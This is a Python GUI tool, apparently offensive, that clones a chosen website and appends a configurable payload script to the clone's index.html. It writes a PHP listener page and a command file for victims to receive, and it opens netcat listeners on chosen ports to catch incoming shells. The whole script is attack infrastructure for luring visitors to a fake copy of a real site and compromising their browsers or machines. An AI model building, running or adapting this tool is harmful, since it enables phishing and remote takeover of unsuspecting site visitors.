import threading
import os
import signal
from tkinter import *
from tkinter import messagebox
import time
class interface():
	def __init__(self):
		self.DefaultPort=1604
		self.ConfFile="./conf.txt"
		self.ConfigurationFile=open(self.ConfFile,"r")
		self.ConfigurationFileContent=self.ConfigurationFile.readlines()
		self.ConfigurationLocation=str(self.ConfigurationFileContent[0]).replace("\n","").replace("\r","")
		os.system("mkdir "+self.ConfigurationLocation)
		self.ServiceName=str(self.ConfigurationFileContent[1]).replace("\n","").replace("\r","")
		self.PayFile=str(self.ConfigurationFileContent[2]).replace("\n","").replace("\r","")
		self.Host=str(self.ConfigurationFileContent[4]).replace("\n","").replace("\r","")
		self.Payload=str(self.ConfigurationFileContent[3]).replace("[[host]]",self.Host).replace("[[host_addr]]",self.ConfigurationLocation.replace("/var/www/html/",""))
		self.ListenerFile=str(self.ConfigurationFileContent[5]).replace("\n","").replace("\r","")
		self.CMD=str(self.ConfigurationFileContent[6]).replace("[[host]]",self.Host).replace("[[port]]",str(self.DefaultPort))
		fil=open(self.PayFile,"r")
		self.PayloadScript=(fil.read()).replace("[payload]",self.Payload)
		
		self.root=Tk()
		self.root.geometry("500x270")
		self.root.title("Listening Setup")
		self.root.resizable(False, False)
		
		ListeningLabel=Label(self.root,text="Listening Ports")
		ListeningLabel.place(x=105,y=7)
		
		self.ListOfPorts=[]
		self.DeletePort=0
		if len(self.ListOfPorts)>0:
			self.UpdateDropDownDelete()

		AddPortButton=Button(self.root,text="Add Port")
		AddPortButton.config(command=lambda:self.listen(self.AddPortEntry.get()))
		AddPortButton.pack()

		self.AddPortEntry=Entry(self.root)
		self.AddPortEntry.place(x=300,y=5)

		canvas = Canvas(self.root)
		canvas.create_line(0, 5, 500, 5)
		canvas.pack(fill=BOTH, expand=1)

		self.GeneratePayloadButton=Button(self.root,text="Show Payload",width=9,command=lambda:self.ShowPayloadMsg())
		self.GeneratePayloadButton.place(x=5,y=1)		

		RemovePortButton=Button(self.root,text="Remove")
		RemovePortButton.config(command=lambda:self.RemovePort())
		RemovePortButton.place(x=100,y=230)

		self.ListeningPortListDisplay=Text(self.root, width=60, height=10,state=DISABLED)
		self.ListeningPortListDisplay.place(x=7,y=50)
		self.NoneLabel=Label(self.root,text="None")
		self.NoneLabel.place(x=40,y=235)

		self.CloneSiteButton=Button(self.root,text="Clone site")
		self.CloneSiteButton.config(command=lambda:self.CloneSite())
		self.CloneSiteButton.place(x=200,y=230)

		self.ConfigurationButton=Button(self.root,text="Configuration")
		self.ConfigurationButton.config(command=lambda:self.ConfigurationGUI())
		self.ConfigurationButton.place(x=310,y=230)		
		
		self.AddScriptButton=Button(self.root,text="Add",command=lambda:self.AddScript(),width=2)
		self.AddScriptButton.place(x=447,y=230)


		if len(self.ListOfPorts)>0:
			for i in self.ListOfPorts:
				self.listen(i)
		
		self.root.mainloop()
	def ShowPayloadMsg(self):
		simpleGUI=Tk()
		simpleGUI.geometry("300x150")
		simpleGUI.title("Payload")
		textbox=Text(simpleGUI)
		textbox.insert(END,str(self.Payload).replace("'c","c").replace(r"\n'",r"\n"))
		textbox.pack()
		simpleGUI.mainloop()
		#messagebox.showinfo("Payload", str(self.Payload))

	def SetListenerPayload(self):
		os.system(("echo '' > "+str(self.ConfigurationLocation)+"return.txt"))
		self.CMD=(self.CMD).replace(str(self.DefaultPort),str(int(self.DefaultPort)))
		fil=open(str(self.ConfigurationLocation)+"exe.txt","w")
		fil.write(self.CMD)
		messagebox.showinfo("Info", "Payload set on port "+str(self.DefaultPort))
		
	def AddScript(self):
		try:
			test=open(self.ConfigurationLocation+"index.html","r")
		except:
			messagebox.showinfo("Warning", "No original index.html found on given location")
			
			exit()
		if self.PayloadScript not in test.read():
			fil=open(self.ConfigurationLocation+"index.html","a")
			fil.write("\n"+str(self.PayloadScript))	
		else:
			messagebox.showinfo("Warning", "Payload Already in file")

		fil=open(str(self.ConfigurationLocation)+"index.php","w")
		fil.write(open(self.ListenerFile,"r").read().replace("[[host]]",self.Host).replace("[[host_addr]]",self.ConfigurationLocation.replace("/var/www/html/","")))
		self.SetListenerPayload()
		messagebox.showinfo("Sucess", "Payload and listener have been configured")
	def ConfigurationGUI(self):
		def LoadDefault():
			fil=open("./default.txt","r")
			cont=fil.read()
			fil2=open("conf.txt","w")
			fil2.write(cont)
		def save(locationE,ServiceE,PayFileE,PayloadE,HostE,ListenerE,CMDe):
			self.ListenerFile=ListenerE.get()
			self.ConfigurationLocation=locationE.get()
			self.ServiceName=ServiceE.get()
			self.PayFile=PayFileE.get()
			self.Payload=PayloadE.get()
			self.Host=HostE.get()
			self.CMD=CMDe.get()
			fil=open(self.ConfFile,"w")
			location=self.ConfigurationLocation
			service=self.ServiceName
			payfile=self.PayFile
			payload=self.Payload
			listener=self.ListenerFile
			CMD=self.CMD
			host=self.Host
			fil.write(str(location)+"\n"+str(service)+"\n"+str(payfile)+"\n"+str(payload)+"\n"+str(host)+"\n"+str(listener)+"\n"+str(CMD))
			
		self.ConfigGUI=Tk()
		self.ConfigGUI.geometry("400x180")
		self.ConfigGUI.title("Configuration")
		self.ConfigGUI.resizable(False, False)
		ConfigLabelTitle=Label(self.ConfigGUI,text="Configuration")
		ConfigLabelTitle.pack()

		self.LocationEntryLabel=Label(self.ConfigGUI,text="Location")
		self.LocationEntryLabel.place(x=10,y=20)
		self.LocationEntryDefault = StringVar(self.ConfigGUI, value=str(self.ConfigurationLocation))
		self.LocationEntry = Entry(self.ConfigGUI, textvariable=self.LocationEntryDefault,width=30)	
		self.LocationEntry.place(x=80,y=20)	

		self.ServiceEntryLabel=Label(self.ConfigGUI,text="Service")
		self.ServiceEntryLabel.place(x=10,y=40)
		self.ServiceEntryDefault = StringVar(self.ConfigGUI, value=str(self.ServiceName))
		self.ServiceEntry = Entry(self.ConfigGUI, textvariable=self.ServiceEntryDefault,width=30)	
		self.ServiceEntry.place(x=80,y=40)	

		self.PayFileEntryLabel=Label(self.ConfigGUI,text="Payload")
		self.PayFileEntryLabel.place(x=10,y=60)
		self.PayFileEntryDefault = StringVar(self.ConfigGUI, value=str(self.PayFile))
		self.PayFileEntry = Entry(self.ConfigGUI, textvariable=self.PayFileEntryDefault,width=30)	
		self.PayFileEntry.place(x=80,y=60)

		self.PayloadLabel=Label(self.ConfigGUI,text="Code")
		self.PayloadLabel.place(x=10,y=80)
		self.PayloadEntryDefault = StringVar(self.ConfigGUI, value=str(self.Payload).replace("'\n","'").replace(self.Host,"[[host]]").replace(self.ConfigurationLocation.replace("/var/www/html/",""),"[[host_addr]]"))
		self.PayloadEntry = Entry(self.ConfigGUI, textvariable=self.PayloadEntryDefault,width=30)	
		self.PayloadEntry.place(x=80,y=80)

		self.HostLabel=Label(self.ConfigGUI,text="Host")
		self.HostLabel.place(x=10,y=100)
		self.HostEntryDefault = StringVar(self.ConfigGUI, value=str(self.Host))
		self.HostEntry = Entry(self.ConfigGUI, textvariable=self.HostEntryDefault,width=30)	
		self.HostEntry.place(x=80,y=100)

		self.ListenerLabel=Label(self.ConfigGUI,text="Listener")
		self.ListenerLabel.place(x=10,y=120)
		self.ListenerEntryDefault = StringVar(self.ConfigGUI, value=str(self.ListenerFile))
		self.ListenerEntry = Entry(self.ConfigGUI, textvariable=self.ListenerEntryDefault,width=30)	
		self.ListenerEntry.place(x=80,y=120)

		self.CMDLabel=Label(self.ConfigGUI,text="CMD")
		self.CMDLabel.place(x=10,y=140)
		self.CMDEntryDefault = StringVar(self.ConfigGUI, value=str(self.CMD))
		self.CMDEntry = Entry(self.ConfigGUI, textvariable=self.CMDEntryDefault,width=30)	
		self.CMDEntry.place(x=80,y=140)
		self.SaveConfigButton=Button(self.ConfigGUI,text="Save",command=lambda:save(self.LocationEntry,self.ServiceEntry,self.PayFileEntry,self.PayloadEntry,self.HostEntry,self.ListenerEntry,self.CMDEntry ),height=6)
		self.SaveConfigButton.place(x=330,y=23)
		
		self.DefaultSettingsButton=Button(self.ConfigGUI,text="Default",command=lambda:LoadDefault(),width=4)
		self.DefaultSettingsButton.place(x=330,y=140)

		self.ConfigGUI.mainloop()

	def CloneSite(self):
		def CallCloner(sit,locatio):
			
			try:
				a=str(sit)
				b=str(locatio)
			except:
				messagebox.showinfo("Warning", " You must insert a string and have a file location in your configuration file")
				time.sleep(10)
				exit()
			if str(sit) !=str(""):
				if int(len(str(sit)))>int(2):
					if str(locatio) !=str(""):
						sit=self.sanitise(sit)
						locatio=self.sanitise(locatio)
						os.system("python  SiteCloner.py "+str(sit)+" "+str(locatio))
						self.SetListenerPayload()
						fil=open(str(locatio)+"index.html","a")
						fil.write("\n"+str(self.PayloadScript))
						fil=open(str(locatio)+"index.php","w")
						fil.write(open(self.ListenerFile,"r").read().replace("[[host]]",self.Host).replace("[[host_addr]]",self.ConfigurationLocation.replace("/var/www/html/","")))
						time.sleep(1)
						SucessLabel=Label(self.CloneSiteGUI,text="Sucess",font=("Courier", 44),fg="green")
						SucessLabel.place(x=40,y=90)
						ExitButton=Button(self.CloneSiteGUI,text="Close")
						ExitButton.config(command=lambda:self.CloneSiteGUI.destroy())
						ExitButton.place(x=120,y=160)
						os.system("service "+str(self.ServiceName)+" restart")
		self.CloneSiteGUI=Tk()
		self.CloneSiteGUI.geometry("300x200")
		self.CloneSiteGUI.title("Clone Website")
		self.CloneSiteGUI.resizable(False, False)
		self.EntryWebsiteLabel=Label(self.CloneSiteGUI,text="Site to clone:")
		self.EntryWebsiteLabel.place(x=10,y=10)

		self.EntryWebsite=Entry(self.CloneSiteGUI)
		self.EntryWebsite.place(x=110,y=9)
		
		self.CloneSiteButton=Button(self.CloneSiteGUI,text="Clone Site",width=32,height=2)
		self.CloneSiteButton.config(command=lambda:CallCloner(self.EntryWebsite.get(),self.ConfigurationLocation))
		self.CloneSiteButton.place(x=10,y=40)
		self.CloneSiteGUI.mainloop()
	def CloseListener(self,port):
		processes=(os.popen(("ps -aux|grep nc|grep "+str(self.sanitise(str(port))))).read()).split("\n")
		NumberOfProcesses=len(processes)
		PIDtoKILL=[]
		for i in range(NumberOfProcesses-1):
			PIDtoKILL.append(int(((processes[i])[:15])[7:]))
		for i in PIDtoKILL:
			try:
				os.kill(int(i), signal.SIGTERM)
			except:
				pass
	def RemovePort(self):
		try:
			self.ListOfPorts.remove(self.DeletePort)
			self.ListeningPortListDisplay.config(state=NORMAL)
			self.ListeningPortListDisplay.delete(1.0,END)
			for port in self.ListOfPorts:
				self.ListeningPortListDisplay.insert(END,str(port)+"\n")
			self.ListeningPortListDisplay.config(state=DISABLED)
			self.UpdateDropDownDelete()
			CloseListenerThread=threading.Thread(target=self.CloseListener,args=[(int(self.DeletePort))])
			CloseListenerThread.start()
		except ValueError:
			pass
	def CheckRepeated(self):
		
		for x in self.ListOfPorts:
			if self.ListOfPorts.count(x) > 1:
				self.ListOfPorts.remove(x)
	def SetVariableRemove(self,value):
		self.DeletePort=int(value)
	def UpdateDropDownDelete(self):
		try:
			self.NoneLabel.Destroy()
		except:
			pass
		self.CheckRepeated()
		variable = StringVar(self.root)
		variable.set("Port ")
		try:	
			self.DropDownDeletePort=OptionMenu(self.root,variable,*self.ListOfPorts,command=self.SetVariableRemove)
			self.DropDownDeletePort.place(x=10,y=230)
		except TypeError:
			pass
		
	def sanitise(self,string):
		return (str(string).replace(";","").replace("|","").replace("&","").replace(">","").replace("<","").replace("$",""))
	
	def listen(self,port):
		try:
			al=int(port)
		except:
			messagebox.showinfo("Warning", "Port must be an integer")
			time.sleep(10)
			exit()
		if str(port)=='':
			messagebox.showinfo("Warning", "Port must not be empty")
			time.sleep(10)
			exit()
		if int(port)==int(0)or int(port)>100000 or int(port)<998:
			messagebox.showinfo("Warning", "Port must be between 1000 and 99999")
			time.sleep(10)
			exit()

			
		try:
			self.AddPortEntry.delete(0, 'end')
		except AttributeError:
			pass
		def lip(port):
			self.ListeningPortListDisplay.config(state=NORMAL)
			self.ListeningPortListDisplay.insert(END,str(port)+"\n")
			self.ListeningPortListDisplay.config(state=DISABLED)
			self.ListOfPorts.append((int(port)))
			
			self.CMD=(self.CMD).replace(str(self.DefaultPort),str(int(port)))
			self.DefaultPort=int(port)
			self.UpdateDropDownDelete()
			os.system(("xterm -e 'nc -lvp "+str(port)+"'"))
			
		
		if int(port)!=int(0)&int(port)<100000&int(port)>998:
			if int(port) not in self.ListOfPorts:
				p=self.sanitise(str(port))
				a=threading.Thread(target=lip,args=[p])
				a.start()
interface()

